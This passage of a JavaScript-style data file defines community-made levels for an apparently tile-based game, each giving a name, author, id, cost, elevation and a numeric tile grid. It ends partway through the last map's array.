maps.push({name="Cave Spelunking V2",author="MoistNoodlez",id="#1661214619",direction="forward",cost=588,elevation=-19,map=[1,124,2,2,124,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,124,72,72,124,1,114,114,114,114,114,114,109,109,109,109,109,109,109,1,1,124,72,72,124,1,114,74,74,74,74,74,67,74,74,74,74,74,109,1,1,124,72,72,124,1,114,74,74,74,74,74,67,74,74,74,74,74,109,1,1,124,72,72,124,1,114,71,71,114,114,114,109,109,109,109,72,72,109,1,1,124,72,72,124,1,114,71,71,114,1,1,1,1,1,109,72,72,109,1,1,124,72,72,124,1,114,71,71,114,114,114,114,114,1,109,72,72,109,1,1,124,72,72,124,1,114,71,71,73,73,73,73,114,1,109,72,72,109,1,1,119,67,67,119,1,114,71,71,73,73,73,73,114,1,105,67,67,105,1,1,119,72,72,119,1,114,114,114,114,114,71,71,114,1,105,72,72,105,1,1,119,72,72,119,1,1,1,1,1,114,71,71,114,1,105,66,66,105,1,1,119,72,72,119,1,1,1,1,1,114,71,71,114,1,105,66,66,105,1,1,119,72,72,119,119,119,119,114,114,114,71,71,114,1,105,66,66,105,1,1,119,74,74,74,74,74,74,67,74,74,71,71,114,1,105,66,66,105,1,1,119,74,74,74,74,74,74,67,74,74,71,71,114,1,105,66,66,105,1,1,119,119,119,119,119,119,119,114,114,114,114,114,114,1,105,66,66,105,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,105,66,66,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,66,66,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,66,66,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,2,2,105,1]});
maps.push({name="Anal Fissures",author="MoistNoodlez",id="#1661218474",direction="forward",cost=402,elevation=-14,map=[0,0,0,1,121,122,122,123,124,124,124,124,124,124,2,2,124,124,124,1,0,0,0,1,121,88,122,123,76,124,124,88,124,124,124,124,124,124,124,1,0,0,0,1,121,122,122,76,123,123,124,124,76,124,124,124,124,76,123,1,0,0,0,1,1,121,122,76,76,123,123,123,123,76,76,76,76,123,123,1,0,0,0,0,1,121,76,76,122,76,123,123,123,76,123,123,76,76,1,1,0,0,0,0,1,121,76,121,122,122,76,122,76,76,122,122,76,76,1,0,0,0,0,0,1,120,120,121,121,88,121,76,76,121,121,76,121,88,1,0,0,0,0,0,1,120,120,76,120,120,120,120,120,120,76,120,120,120,1,0,0,0,0,0,0,1,119,76,76,119,119,119,119,119,76,119,119,1,1,0,0,0,0,0,0,0,1,119,76,76,76,119,76,76,119,119,88,1,0,0,0,0,0,0,0,0,1,1,1,119,119,119,119,76,119,119,1,1,0,0,0,0,0,0,0,0,0,0,1,1,119,91,91,91,91,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,91,91,76,1,76,119,1,0,0,0,0,0,0,0,0,0,1,116,93,116,76,76,116,76,116,1,1,0,0,0,0,0,0,0,0,0,1,94,88,114,76,114,114,76,114,114,1,1,0,0,0,0,0,0,0,0,1,1,114,114,76,114,114,76,76,112,112,1,1,0,0,0,0,0,0,1,1,112,112,112,112,112,112,112,76,112,112,112,1,0,0,0,0,0,0,1,1,111,111,111,88,111,111,76,76,76,111,88,1,0,0,0,0,0,0,1,111,76,76,76,110,110,76,76,110,110,110,110,1,1,0,0,0,0,0,1,76,76,110,110,2,2,110,110,110,110,76,110,110,1]});
maps.push({name="freebie",author="iProbie",id="#1661224451",direction="forward",cost=52,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="freebie but oh no",author="iProbie",id="#1661225550",direction="forward",cost=108,elevation=-14,map=[0,0,0,0,0,0,0,0,19,2,2,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,65,65,65,65,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,94,5,5,5,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,5,5,5,94,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,94,5,5,5,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,5,5,5,94,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,94,5,5,5,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,5,5,5,94,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Diglett Ex",author="HaRyDe",id="#1661276816",direction="forward",cost=424,elevation=0,map=[0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,2,2,1,0,0,0,0,0,0,1,5,93,1,1,5,5,95,5,5,1,5,5,1,1,1,1,1,1,1,1,5,1,1,1,5,5,95,5,5,1,5,5,1,1,5,5,95,91,90,5,90,5,5,1,91,91,1,5,90,1,5,5,1,1,5,5,95,91,5,5,5,5,5,1,90,5,1,5,90,1,5,5,1,1,5,5,1,1,1,5,1,5,90,1,5,5,1,86,5,1,5,90,1,1,90,5,1,0,1,5,1,5,5,1,5,90,1,90,5,1,90,5,1,1,90,5,1,0,1,94,1,90,86,1,5,86,1,90,5,1,90,90,1,1,86,90,1,0,1,1,1,5,90,1,90,5,1,5,5,95,5,86,1,1,5,90,1,0,0,0,1,90,5,1,90,5,1,5,5,95,5,5,1,1,5,5,1,1,1,1,1,5,5,1,5,5,1,1,1,1,1,1,1,1,5,90,5,86,5,5,1,5,90,1,5,5,90,91,95,5,5,1,0,1,5,5,5,90,5,5,1,5,5,1,5,90,5,91,95,5,5,1,0,1,1,1,1,1,95,95,1,95,95,1,1,1,1,1,1,5,90,1,0,1,5,5,90,90,5,5,1,5,5,5,90,90,5,5,95,5,5,1,0,1,5,5,5,5,5,5,1,90,5,5,90,5,90,5,95,5,90,1,0,1,5,90,1,91,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,5,5,1,91,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,96,96,1,5,5,5,5,97,1,0,0,0,0,0,0,0,0,0,0,1,2,2,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Omaha Bitch",author="HaRyDe",id="#1661277830",direction="forward",cost=371,elevation=3,map=[0,0,66,66,5,5,5,5,2,2,5,5,5,5,66,66,0,0,0,0,0,0,66,66,5,5,90,5,5,5,5,90,5,5,66,66,0,0,0,0,0,0,66,66,5,5,5,86,90,5,86,5,5,5,66,66,0,0,0,0,0,0,66,66,5,90,5,5,5,5,5,5,90,5,66,66,0,0,0,0,0,0,66,66,5,5,86,90,5,86,90,5,86,5,66,66,0,0,0,0,0,0,66,66,5,5,5,5,5,5,5,5,5,5,66,66,0,0,0,0,0,0,66,66,6,6,6,6,6,6,6,6,6,6,66,66,0,0,0,0,0,0,66,66,7,7,7,7,97,7,7,7,7,7,66,66,0,0,0,0,0,0,0,0,96,96,96,96,96,96,96,96,96,96,0,0,0,0,0,0,0,0,0,0,5,5,5,5,6,5,5,5,6,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,7,5,5,5,6,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,8,5,5,8,6,5,0,0,0,0,0,0,1,1,1,1,1,1,1,8,8,8,8,1,1,1,1,1,1,1,1,1,1,8,86,8,86,8,1,8,8,8,8,1,1,8,8,86,8,1,0,0,1,8,1,1,1,8,1,95,1,1,1,1,1,1,8,1,86,1,0,0,1,86,1,0,1,8,8,8,1,8,86,8,8,1,8,1,8,1,1,99,1,86,1,0,1,1,1,1,1,86,1,1,86,1,86,1,8,8,8,8,1,8,1,1,1,1,1,1,1,8,1,8,8,1,8,1,8,8,1,8,1,8,8,86,8,86,8,8,86,8,1,8,1,1,8,1,98,98,1,0,1,1,1,1,1,1,1,1,1,1,1,8,8,86,8,1,2,2,1,0]});
maps.push({name="Wet walkway",author="Luffaren",id="#1661283640",direction="right",cost=617,elevation=0,map=[1,0,0,0,0,0,0,0,0,0,0,0,90,14,14,2,2,14,14,90,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,14,1,1,14,0,67,67,0,14,0,0,0,0,0,1,89,14,65,65,14,89,1,1,90,14,65,65,14,90,0,36,93,94,0,1,14,65,65,65,65,14,1,1,14,14,65,65,14,14,1,1,1,1,1,1,65,65,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,1,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,1,1,1,1,1,1,65,65,65,65,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,65,65,65,1,1,1,1,65,65,65,65,65,65,65,14,14,14,90,1,65,65,65,65,1,1,1,65,65,65,65,65,65,65,65,65,14,89,14,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,14,14,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,14,2,1,1,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,14,2,1,1,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,14,14,1,1,1,1,65,65,65,65,65,65,65,65,65,65,65,65,65,14,89,14,1,1,1,1,67,67,67,67,67,67,67,67,67,67,67,67,14,14,14,90]});
maps.push({name="Shallow climbing",author="Luffaren",id="#1661284170",direction="left",cost=622,elevation=19,map=[5,5,2,2,5,5,0,67,67,0,0,0,67,67,67,0,0,0,0,0,5,5,5,5,5,5,7,7,7,9,9,9,11,11,11,13,13,13,13,13,5,65,65,65,65,65,67,65,65,67,65,65,67,65,65,67,65,65,65,13,5,65,65,65,65,65,67,65,65,67,65,65,67,65,65,67,65,65,65,13,5,65,65,65,65,65,67,65,65,67,65,65,67,65,65,67,65,65,65,13,5,5,5,5,5,5,7,7,7,9,9,9,11,11,11,13,65,65,65,13,5,5,5,5,5,5,5,5,5,5,1,1,1,1,1,13,65,65,65,13,5,5,5,94,5,94,5,94,5,5,1,93,105,93,1,15,67,67,67,15,90,24,5,5,94,5,94,5,5,5,96,105,93,105,1,15,65,65,65,15,24,97,5,5,5,5,5,5,5,5,1,93,105,93,1,15,65,65,65,15,90,24,5,90,5,90,5,90,5,90,1,1,1,1,1,15,65,65,65,15,24,24,24,23,23,23,21,21,21,19,19,19,17,17,17,17,67,67,67,17,24,24,65,65,65,67,65,65,67,65,65,67,65,65,65,65,65,65,65,17,24,24,65,65,65,67,65,65,67,65,65,67,65,65,65,65,65,65,65,17,24,24,65,65,65,67,65,65,67,65,65,67,65,65,65,65,65,65,65,17,2,24,65,65,65,67,65,65,67,65,65,67,65,65,65,65,65,65,65,17,2,24,65,65,65,67,65,65,67,65,65,67,65,65,65,65,65,65,65,17,24,24,65,65,65,67,65,65,67,65,65,67,65,65,65,65,65,65,65,17,24,24,24,23,23,23,21,21,21,19,19,19,17,17,17,17,17,17,17,17,24,0,0,67,67,67,0,0,0,67,67,67,0,0,0,0,0,0,0,0]});
maps.push({name="Badlands",author="Luffaren",id="#1661284664",direction="forward",cost=526,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,24,77,0,5,2,2,5,0,77,24,24,24,24,24,24,24,24,24,24,24,24,77,0,5,5,5,76,0,77,24,24,0,77,77,77,77,77,77,77,77,77,0,0,5,5,89,5,0,77,24,24,77,0,0,0,0,0,0,0,0,0,0,0,5,76,5,5,0,77,24,24,77,0,5,76,76,5,5,94,5,76,5,5,76,5,5,5,0,77,24,24,77,0,76,76,5,5,5,5,89,5,5,5,5,89,5,76,0,77,24,24,77,0,5,5,5,89,5,76,5,76,76,76,5,5,5,5,0,77,24,24,77,0,5,5,76,0,0,0,0,0,0,0,0,0,0,0,0,77,24,24,77,0,5,5,76,0,0,77,77,77,77,77,77,77,77,77,77,0,24,24,77,0,76,76,5,0,77,24,24,24,24,24,24,24,24,24,24,24,24,24,77,0,5,76,5,0,0,77,77,77,77,77,77,77,77,77,77,0,24,24,77,0,76,5,5,0,0,0,0,0,0,0,0,0,0,0,0,77,24,24,77,0,5,89,5,76,76,5,5,5,5,89,5,76,5,5,0,77,24,24,77,0,5,5,5,5,76,76,5,5,5,5,5,76,76,76,0,77,24,24,77,0,76,5,5,5,5,5,5,5,5,5,5,5,76,5,0,77,24,24,77,0,5,76,76,5,89,5,76,76,76,5,5,89,5,5,0,77,24,24,77,0,93,5,76,5,5,5,76,5,5,5,5,5,5,76,0,77,24,24,77,0,0,0,0,0,0,0,0,0,0,0,76,5,5,5,0,77,24,24,0,77,77,77,77,77,77,77,77,77,0,0,5,5,5,76,0,77,24,24,24,24,24,24,24,24,24,24,24,24,77,0,5,2,2,5,0,77,24]});
maps.push({name="fraz fortress",author="fraz",id="#1661287474",direction="forward",cost=437,elevation=19,map=[66,66,66,66,66,66,66,66,66,2,2,66,66,66,66,66,66,66,66,66,5,5,5,5,5,5,5,5,66,66,66,66,5,5,5,5,5,5,5,5,5,5,124,124,124,5,5,5,5,5,5,5,5,5,5,124,124,124,5,5,5,5,124,97,124,5,5,5,5,5,5,5,5,5,5,124,97,124,5,5,5,5,124,124,124,123,123,123,123,105,123,123,123,123,123,124,124,124,5,5,5,5,5,5,123,5,3,5,5,5,5,5,5,3,5,123,5,5,5,5,5,5,5,5,123,3,5,5,5,5,5,5,5,5,3,123,5,5,5,5,5,5,5,5,123,5,5,5,5,5,5,5,5,5,5,123,5,5,5,5,5,5,5,5,123,5,5,5,65,65,65,5,5,5,5,123,5,5,5,5,5,5,5,5,105,5,5,5,65,90,65,5,5,5,5,105,5,5,5,5,5,5,5,5,123,5,5,5,65,65,65,5,5,5,5,123,5,5,5,5,5,5,5,5,123,5,5,5,5,5,5,5,5,5,5,123,5,5,5,5,5,5,5,5,123,3,5,5,5,5,5,5,5,5,3,123,5,5,5,5,5,5,5,5,123,5,3,5,5,5,5,5,5,3,5,123,5,5,5,5,5,5,124,124,124,123,123,123,123,123,123,123,123,123,123,124,124,124,5,5,5,5,124,97,124,5,5,0,0,24,24,0,0,5,5,124,97,124,5,5,5,5,124,124,124,5,5,0,96,24,24,96,0,5,5,124,124,124,5,5,5,5,5,5,5,5,5,0,0,96,96,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,24,24,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,2,2,0,5,5,5,5,5,5,5,5]});
maps.push({name="Enigma",author="Block",id="#1661304481",direction="forward",cost=550,elevation=0,map=[0,0,0,0,0,0,0,0,12,2,2,12,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,127,17,17,17,17,16,15,14,13,12,12,13,14,15,16,17,17,17,17,127,0,17,66,66,17,16,15,14,13,12,12,13,14,15,16,17,66,66,17,0,0,17,72,72,67,0,12,12,12,12,12,12,12,12,0,67,72,72,17,0,0,17,72,72,67,0,12,12,12,12,12,12,12,12,0,67,72,72,17,0,0,17,72,72,67,0,12,75,75,75,75,75,75,12,0,67,72,72,17,0,0,17,72,72,67,0,12,75,77,77,77,77,75,12,0,67,72,72,17,0,0,17,72,72,67,0,12,75,77,0,0,77,75,12,0,67,72,72,17,0,12,17,72,72,67,0,12,75,77,0,0,77,75,12,0,67,72,72,17,12,127,17,72,72,67,0,12,75,77,0,0,77,75,12,0,67,72,72,17,127,0,17,72,72,67,0,12,75,77,0,0,77,75,12,0,67,72,72,17,0,0,17,72,72,67,0,12,75,77,77,77,77,75,12,0,67,72,72,17,0,0,17,72,72,67,0,12,75,75,75,75,75,75,12,0,67,72,72,17,0,0,17,72,72,67,0,12,12,12,12,12,12,12,12,0,67,72,72,17,0,0,17,72,72,67,0,12,12,12,12,12,12,12,12,0,67,72,72,17,0,0,17,66,66,17,16,15,14,13,12,12,13,14,15,16,17,66,66,17,0,12,17,17,17,17,16,15,14,13,12,12,13,14,15,16,17,17,17,17,12,129,0,0,0,12,12,12,12,12,12,12,12,12,12,12,12,0,0,0,128,0,0,0,0,0,0,0,0,12,2,2,12,0,0,0,0,0,0,0,0]});
maps.push({name="Fractured",author="Block",id="#1661304507",direction="left",cost=338,elevation=-19,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,2,5,5,5,5,0,6,6,107,44,44,107,7,7,7,0,7,8,8,21,2,5,5,5,5,0,6,6,107,44,44,107,7,7,7,0,7,8,0,0,0,0,5,5,5,0,6,6,107,44,44,107,7,7,7,0,7,8,8,16,18,7,0,6,1,1,1,1,1,24,24,1,1,1,1,1,1,9,9,18,19,0,7,7,1,16,16,16,117,58,58,118,119,119,120,120,1,9,9,0,20,8,8,8,1,16,16,16,117,58,58,118,119,119,120,120,1,9,0,9,10,0,9,9,1,16,16,16,117,58,58,118,119,119,120,120,1,9,0,9,0,10,10,10,1,50,50,50,110,24,24,23,22,21,21,21,1,10,10,17,0,10,89,10,110,50,50,50,110,24,24,23,22,21,21,21,1,10,0,0,10,0,0,10,110,50,50,50,110,109,1,1,1,1,1,1,1,10,10,0,0,10,0,0,1,50,50,110,0,77,77,77,77,0,128,10,10,10,10,16,0,0,10,0,1,50,50,110,0,77,76,76,77,0,128,10,10,10,0,0,0,10,0,10,1,50,50,110,0,77,77,77,77,0,128,10,10,0,0,10,10,0,10,0,1,16,16,16,1,1,1,0,0,1,11,11,11,0,10,10,0,0,10,0,1,15,15,15,14,13,13,1,1,12,12,12,11,0,0,0,0,10,89,10,1,0,14,14,14,13,13,13,12,12,12,12,0,0,11,11,10,0,10,0,24,0,0,14,0,0,13,0,12,12,0,0,0,12,0,0,0,10,93,10,23,0,0,0,0,0,0,0,0,0,0,11,0,0,0,11,0,0,10,0,22,21,20,0,24,0,0,22,0,17,0,0,11,0,11,94]});
maps.push({name="Enveloped",author="Mrs Block",id="#1661304593",direction="forward",cost=392,elevation=0,map=[0,12,12,95,95,12,2,2,12,12,12,12,12,12,12,95,95,12,12,12,0,12,12,95,95,12,12,12,12,12,12,12,12,12,12,95,95,12,12,102,0,12,12,95,95,12,12,12,12,12,12,12,12,12,12,95,95,12,12,12,0,12,12,0,0,0,12,12,0,0,0,12,12,0,0,0,0,0,127,127,0,12,12,0,0,0,12,12,0,0,0,12,12,0,0,0,0,0,0,0,0,13,13,0,0,0,12,12,0,0,0,13,13,0,77,77,77,77,76,76,0,14,14,0,0,0,96,96,0,0,0,14,14,0,77,24,24,77,76,76,0,15,15,0,0,0,12,12,0,0,0,15,15,0,77,24,24,77,76,76,0,16,16,0,0,0,12,12,0,0,0,16,16,0,77,77,77,77,76,76,0,17,17,0,0,0,12,12,0,0,0,17,17,0,0,75,75,0,0,0,0,18,18,0,0,0,98,98,0,0,0,18,18,0,0,75,75,0,12,12,0,19,19,0,0,0,12,12,0,0,0,19,19,0,0,75,75,0,127,127,0,97,19,0,0,0,12,12,0,0,0,19,99,0,77,77,77,77,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,77,24,24,77,76,76,0,0,0,0,0,0,12,12,0,0,0,0,0,0,77,24,24,77,76,76,77,77,77,77,0,0,101,101,0,0,0,0,0,0,77,77,77,77,76,76,77,24,24,77,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,77,24,24,77,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,77,77,77,77,0,0,12,12,12,12,12,12,12,12,12,12,12,128,12,12,0,0,0,0,0,0,2,2,12,12,12,12,12,12,12,12,12,128,12,12]});
maps.push({name="Step it up",author="Luffaren",id="#1661330497",direction="forward",cost=231,elevation=19,map=[0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,94,5,5,94,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,125,125,125,125,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,1,1,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,90,1,1,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,90,14,14,24,24,24,24,91,91,93,24,0,0,0,14,14,14,14,14,14,125,14,14,24,24,24,24,24,91,91,93,0,0,0,14,14,14,14,89,14,125,14,14,24,24,24,24,24,24,91,91,0,0,0,14,14,89,89,14,14,125,14,14,24,24,24,24,24,24,24,91,0,0,0,14,14,14,14,14,14,125,14,14,24,24,24,89,24,24,24,24,0,0,0,14,14,14,14,14,14,125,14,14,24,24,24,24,24,24,24,24,0,0,0,14,14,14,14,14,14,14,14,14,24,24,90,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,90,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,2,2,24]});
maps.push({name="the armory",author="iProbie",id="#1661337069",direction="left",cost=330,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,1,1,1,1,1,1,96,96,1,1,1,1,1,1,1,5,0,0,0,5,1,99,5,5,5,5,5,5,5,5,5,5,5,5,1,5,0,0,0,5,1,5,1,1,1,1,98,98,1,1,1,1,1,5,1,5,0,0,0,5,1,5,1,5,5,5,5,5,5,5,5,5,1,5,1,5,0,0,0,5,1,5,1,5,1,101,101,101,101,101,1,5,1,5,1,5,0,0,0,5,1,5,1,5,1,5,93,93,93,5,1,5,1,5,1,5,0,0,0,5,96,5,98,5,101,5,93,5,93,5,101,5,98,5,96,5,0,0,0,5,1,5,1,5,1,5,93,93,93,5,1,5,1,5,1,5,0,0,0,5,1,5,1,5,1,101,101,101,101,101,1,5,1,5,1,5,0,0,0,5,1,5,1,5,5,5,5,5,5,5,5,102,1,5,1,5,0,5,5,5,1,5,1,1,1,1,98,98,1,1,1,1,1,5,1,5,0,2,5,5,1,5,5,5,5,5,5,5,5,5,5,5,5,5,1,5,0,2,5,5,1,1,1,1,1,1,96,96,1,1,1,1,1,1,1,5,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,97,5,5,0]});
maps.push({name="ooooh a button",author="iProbie",id="#1661338023",direction="right",cost=309,elevation=0,map=[0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,5,5,1,1,1,1,1,1,1,1,0,0,0,0,1,1,1,5,5,5,5,5,5,1,94,1,94,1,94,1,0,0,0,0,1,94,96,5,5,5,5,5,5,1,96,1,96,1,96,1,0,0,0,0,1,1,1,5,5,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,1,94,96,5,5,5,5,5,5,5,5,5,5,1,1,1,0,0,0,0,1,1,1,5,5,6,6,6,6,6,5,5,5,96,94,1,0,0,0,0,1,94,96,5,5,6,7,7,7,6,5,5,5,1,1,1,0,0,0,0,1,1,1,5,5,6,7,97,7,6,5,5,5,96,94,1,0,0,0,0,1,94,96,5,5,6,7,7,7,6,5,5,5,1,1,1,0,0,0,0,1,1,1,5,5,6,6,6,6,6,5,5,5,5,5,5,5,5,0,0,1,94,96,5,5,5,5,5,5,5,5,5,5,5,5,5,5,2,0,0,1,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,2,0,0,1,94,96,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,1,1,1,5,1,96,1,96,1,96,1,96,1,96,1,1,0,0,0,0,1,94,96,5,1,94,1,94,1,94,1,94,1,94,1,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Amogus",author="Darnias",id="#1661349462",direction="forward",cost=326,elevation=-6,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,120,120,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,120,120,120,120,120,120,120,120,1,0,0,0,0,0,0,0,0,0,0,1,120,120,120,120,120,120,120,120,1,0,0,0,0,0,0,0,0,0,0,1,120,120,120,120,120,120,120,120,1,0,0,0,0,0,0,0,0,1,1,1,1,120,120,120,1,1,1,1,1,1,1,1,1,1,0,0,1,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,1,1,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,1,1,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,1,1,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,1,1,120,120,120,120,120,120,120,120,120,120,120,120,1,1,1,1,1,1,0,1,120,120,120,120,120,120,120,120,120,120,120,120,1,0,0,0,0,0,0,1,120,120,1,1,1,1,120,120,120,120,120,120,1,1,1,1,1,1,0,1,120,120,66,66,66,71,1,120,120,120,120,120,1,120,120,120,120,120,1,1,120,1,65,65,66,71,1,120,120,120,120,120,120,120,120,120,120,120,1,1,120,1,65,65,66,71,1,120,120,120,120,120,120,120,120,120,120,120,1,1,120,1,65,65,66,71,1,120,120,120,120,120,120,120,120,120,120,120,1,0,1,1,65,65,66,67,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,65,65,66,67,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Ez tp",author="HaRyDe",id="#1661369900",direction="forward",cost=168,elevation=14,map=[0,0,0,0,0,0,0,10,2,2,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,10,10,10,10,24,24,0,0,0,0,0,0,0,0,0,0,10,10,10,98,10,10,10,10,96,10,10,10,0,0,0,0,0,0,0,0,10,133,10,98,10,10,10,10,96,10,131,10,0,0,0,0,0,0,0,0,10,10,10,98,10,99,97,10,96,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,24,24,24,24,23,0,0,0,0,0,0,0